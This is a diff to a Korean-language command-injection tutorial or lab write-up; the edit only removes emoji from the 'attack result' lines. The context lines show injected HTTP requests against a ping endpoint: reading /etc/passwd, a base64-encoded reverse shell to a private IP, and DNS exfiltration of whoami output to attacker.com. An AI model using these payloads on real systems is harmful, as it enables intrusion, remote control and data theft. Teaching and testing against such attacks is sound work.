@@ -121,7 +121,7 @@ GET /ping?ip=127.0.0.1;cat%20/etc/passwd HTTP/1.1
 # www-data:x:33:33:...
 ```
 
-**[공격 결과]**: 명령어 삽입 → 시스템 정보 노출 🔓
+**[공격 결과]**: 명령어 삽입 → 시스템 정보 노출
 
 ---
 
@@ -146,7 +146,7 @@ GET /ping?ip=127.0.0.1;echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0
 # www-data
 ```
 
-**[공격 결과]**: Reverse Shell → 서버 원격 제어 🔓
+**[공격 결과]**: Reverse Shell → 서버 원격 제어
 
 ---
 
@@ -172,7 +172,7 @@ GET /ping?ip=127.0.0.1;ping%20-c1%20$(whoami).attacker.com HTTP/1.1
 # 공격자 DNS 로그: www-data.attacker.com 쿼리 확인
 ```
 
-**[공격 결과]**: Blind 환경에서도 데이터 추출 🔓
+**[공격 결과]**: Blind 환경에서도 데이터 추출
 
 ---
 
